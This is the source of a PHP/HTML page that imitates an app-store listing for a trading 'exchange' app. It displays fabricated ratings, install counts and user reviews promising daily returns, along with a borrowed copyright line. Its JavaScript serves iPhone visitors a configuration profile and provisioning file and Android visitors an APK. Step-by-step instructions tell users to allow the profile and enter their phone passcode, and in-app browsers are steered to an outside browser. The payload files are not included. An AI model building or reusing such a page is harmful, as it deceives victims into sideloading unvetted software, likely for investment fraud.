<?php
$title = file_get_contents("title.txt");
?>
<!doctype html>
<html>
<head design-width="750">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
<meta name="format-detection" content="telephone=no">
<title><?php echo $title; ?>交易所</title>
<link rel="stylesheet" href="css/reset.css"><!--重置样式-->
<link rel="stylesheet" href="css/style.css?v=202012"><!--页面样式-->
<link rel="stylesheet" href="css/swiper.min.css">
<script src="js/auto-size.js"></script><!--设置字体大小-->
<script src="js/jquery.datetimepicker.fulls.js"></script>
</head>
<body ontouchstart="" onmouseover="" style="background:#00349a;">
    <div id="w" style="width:100%; height:100%; position:fixed; z-index:-1; background:url(img/bj.jpg) no-repeat center top;"></div>
	<div class="mobile-wrap center" style="position:absolute; top:80px; left:0; right:0; margin:0 auto; max-width:750px; background:#FFFFFF; border-radius:30px 30px 0 0; width:96%; overflow:hidden;" >
        <main>
        	<div class="appItem">
        		<div class="left"><img src="img/logo.png" alt=""></div>
        		<div class="right" style="line-height: 30px;">
        			<div class="app_name">
        				<strong class="display:inline-block;"><?php echo $title; ?>交易所</strong>
						<div align="right">
							<a onClick="tishi(1)" href="javascript:;"><img style="width:17px; height:17px; vertical-align:middle;" src="img/renzhen.png"><!-- &nbsp;安全认证 --></a>
						</div>
        			</div>
        			<div id="m" class="installBox add_top">
        			   <a class="down" href="javascript:;">下载安装</a>
        			</div>
        		</div>

				<div align="center" style="width:100%; margin-top:20px;">
					<div id="pc" style="display:none;">
						<div id="output"></div>
						<p style="line-height:60px; color:#333333">请使用浏览器或相机扫码下载</p>
						<script src="js/jquery-1.10.2.min.js"></script>
						<script type="text/javascript" src="js/jquery.qrcode.min.js"></script>
						<script>
							 var url = window.location.href;
							jQuery(function(){
								jQuery('#output').qrcode(url);
							
							})
						</script>
					</div>
				</div>
				
        		<div class="appTip">
        			<div class="score">
        			<div class="star">4.9 ★★★★★<var></var></div>
        				<p>19k 个评分</p>
        			</div>
        			<div class="centerBox">
						<b>42万+</b>
						<p>安装</p>
					</div>
        			<div class="age">
        				<b>4+</b>
        				<p>年龄</p>
        			</div>
        		</div>
        	</div>
			
        	<div class="comment">
        		<strong class="publicTitle">评分及评论</strong>
        		<div class="left">
        		    <b>5.0</b>
        			<p>满分 5 分</p>
        		</div>
        		<div class="right">
        			<div class="star_row">
        				<span class="s1"><i></i></span>
        				<div class="lineBox"><var class="v1"></var></div>
        			</div>
        			<div class="star_row">
        				<span class="s2"><i></i></span>
        				<div class="lineBox"><var class="v2"></var></div>
        			</div>
        			<div class="star_row">
        				<span class="s3"><i></i></span>
        				<div class="lineBox"><var class="v3"></var></div>
        			</div>
        			<div class="star_row">
        				<span class="s4"><i></i></span>
        				<div class="lineBox"><var class="v4"></var></div>
        			</div>
        			<div class="star_row">
        				<span class="s5"><i></i></span>
        				<div class="lineBox"><var class="v5"></var></div>
        			</div>
        			<p>19k 个评分</p>
        		</div>
        	</div>
        	
			<div class="appInfo">
			<div class="box">
				<ul>
					
					<li>
					   <span>顺其**然</span><br>
						<p style="text-align:left">非常好的平台。</p>
					</li>
					<li>
					   <span>A蓝红*</span><br>
						<p style="text-align:left">我是朋友推荐的，一直坚持打卡！</p>
					</li>
					<li>
					   <span>灰姑娘*</span><br>
						<p style="text-align:left">哈哈，我领到了</p>
					</li>
					<li>
					   <span>微笑**</span><br>
						<p style="text-align:left"><?php echo $title; ?>交易所，一个有实力的APP</p>
					</li>
					<li>
					   <span>小镇姑*</span><br>
						<p style="text-align:left">这个软件真不错，我用了2年了，强烈推荐</p>
					</li>
					<li>
					   <span>陈静*</span><br>
						<p style="text-align:left">用起来真不多，各方面都好用</p>
					</li>
					<li>
					   <span>轩轩宝*</span><br>
						<p style="text-align:left">每天都有收益，真好</p>
					</li>
                    <li>
                       <span>温柔的台*</span><br>
                        <p style="text-align:left">朋友推荐下载的</p>
                    </li>
					<li>
                       <span>猫猫腻*</span><br>
                        <p style="text-align:left">注册，领，领，领</p>
                    </li>
                
				
					 <div align="center" style="margin:8px 0;"><a style="color:#999999" class="down" href="javascript:;">更多评论</a></div>
					
				</ul>
			</div>
			</div>
			
        	<div class="appInfo">
        		<strong class="publicTitle">信息</strong>
        		<div class="box">
        			<ul>
        				<li>
        					<span>大小</span>
        					<p>7.5 MB</p>
        				</li>
        				<li>
        					<span>语言</span>
        					<p>简体中文</p>
        				</li>
        				<li>
        					<span>年龄分级</span>
        					<p>限4岁以上</p>
        				</li>
        				<li>
        					<span>Copyright</span>
        					<p>© 2020 MobiFun Games Inc</p>
        				</li>
        			</ul>
        		</div>
        	</div>
        </main>
		<div class="footer">
			<p>免责声明：</p>
			<p class="p2" style="font-size:10px">本网系统仅为开发者提供App的下载和安装，App内的内容和运营相关事项由App开发者负责，与本系统无关</p>
		</div>
		
		
		<div id="kai" style="position:absolute; top:10px; left:5%; width:90%; display:none; background:#FFFFFF;">
         <div align="right" onClick="tishi(0)" style="width:100%; height:20px; color:#333333; font-size:14px; font-weight:600;">关闭</div>
			<div class="pic"><img style="width:100%; height:auto;" src="img/0df0c_0_600_411.jpg" alt=""></div>
			<div style="padding:10px; font-size:14px; font-weight:600;">第一步  允许下载APP</div>
			
			<div class="pic"><img style="width:100%; height:auto;" src="img/0665a_1_600_411.jpg" alt=""></div>
			<div style="padding:10px; font-size:14px; font-weight:600;">第二步  允许配置 APP</div>

			<div class="pic"><img style="width:100%; height:auto;" src="img/9179e_3_600_411.jpg" alt=""></div>
			<div style="padding:10px; font-size:14px; font-weight:600;">第三步  点击右上角安装按钮</div>
		
			<div style="padding:20px 10px; font-size:14px; font-weight:600;">第四步  输入您的手机密码，安装成功！</div>
		</div>
		
	
	<div class="pupPic"><img src="img/5cbc4_5_1242_2007.png" alt=""></div>
	<div style="width:100%; height:30px; clear:both"></div>
    </div><!--mobile_wrap-->
	
    <div id="fz" align="center" style="position:fixed; bottom:0; height:60px; border-top:#CCCCCC 1px solid; background:#FFFFFF; width:100%; display:none;">
	   <div>
	      <script type="text/javascript">
			function copyUrl2()
				{
					var Url2=window.location.href;
					var oInput = document.createElement('input');
					oInput.value = Url2;
					document.body.appendChild(oInput);
					oInput.select(); // 选择对象
					document.execCommand("Copy"); // 执行浏览器复制命令
					oInput.className = 'oInput';
					oInput.style.display='none';
					alert('复制成功');
				}
			</script>
			<input style=" height:40px; background:#3399FF; border-radius:20px; margin:10px; text-align:center; padding:4px 20px; color:#ffffff;" type="button" onClick="copyUrl2()" value="点击复制到浏览器打开" />
	   </div>
	</div>
	
	<script src="js/swiper-4.2.0.min.js"></script><!--轮播库-->
	<script>
        $("body").css("cursor","pointer");
        
        var ua = navigator.userAgent.toLowerCase();
        var Sys = {};
        var s;
        (s = ua.match(/version\/([\d.]+).*safari/)) ? Sys.safari = s[1] : 0;

        const isIphonex = () => {
		  if (typeof window !== 'undefined' && window) {
		    return /iphone/gi.test(window.navigator.userAgent) && window.screen.height >= 812;
		  }
		  return false;
		}

		function isAppleIphone(){
			return /(iPhone|iPad|iPod|iOS)/i.test(ua)||isIphonex();
		}
		
        //判断设备是否为iPhone
        if (isAppleIphone()) {  
            if (Sys.safari) {
                $(".down").attr("href",'./EYuYidqBxn.mobileconfig');
                $(".down").click(function(event) {
                    setTimeout(function(){
                        if(confirm){
                            location.href = "./xxx.mobileprovision";
                        }
                    },2500)
                });
                //打开引导弹窗
                $(".doubt").click(function(event) {
                    $(".pup").fadeIn();
                    var swiper = new Swiper('.swiper-container',{
                        loop: true,
                        pagination: {
                            el: '.swiper-pagination',
                        },
                    });
                });
            }else{
                $("body").click(function(event) {
                    $(".pupPic").show();
                 });
            }
        } 
        //判断是否QQ内置浏览器
        else if(ua.indexOf('qq')>-1 && ua.indexOf('mqqbrowser') <0){
		    document.getElementById('fz').style.display='block';
            $(".down").attr("href",'###');
            $("body").click(function(event) {
                $(".pupPic").show();
             });
        }
        //判断Android
        else if (/(Android)/i.test(ua)) {   
            $(".down").attr("href",'./EYuYidqBxn.apk');
            //打开引导弹窗
            $(".doubt").click(function(event) {
                $(".pup").fadeIn();
                var swiper = new Swiper('.swiper-container',{
                    loop: true,
                    pagination: {
                        el: '.swiper-pagination',
                    },
                });
            });
        }
        //在微信中打开
        if (ua.match(/MicroMessenger/i) == "micromessenger") {
		    document.getElementById('fz').style.display='block';
            $(".down").attr("href",'###');
            $("body").click(function(event) {
                $(".pupPic").show();
             });
        }
        
		//关闭弹窗
		$(".colse").click(function(event) {
			$(".pup").fadeOut();
		});

       var s = document.body.clientWidth; 　
	   if(s < 500){
		 document.getElementById("w").style.backgroundSize="1500px auto";
	   }
	</script>
	
<script language="javascript">
function tishi(s) {
	if(s>0)
	{
		document.getElementById('kai').style.display='block';
	}else{
		document.getElementById('kai').style.display='none';
	}
 } 
 var ua = window.navigator.userAgent;
 var isSafari = ua.indexOf("Safari") != -1 && ua.indexOf("Version") != -1;
 var isIphone = ua.indexOf("iPhone") != -1 && ua.indexOf("Version") != -1;
 var isIPad = isSafari && !isIphone && 'ontouchend' in document;

 if (!(/windows phone|iphone|iPad|iPod|Pad|android/ig.test(window.navigator.userAgent)||isIphonex())) {
      document.getElementById('pc').style.display='block';                   
 }else{
      document.getElementById('m').style.display='block';
 }
</script>

</body>
</html>
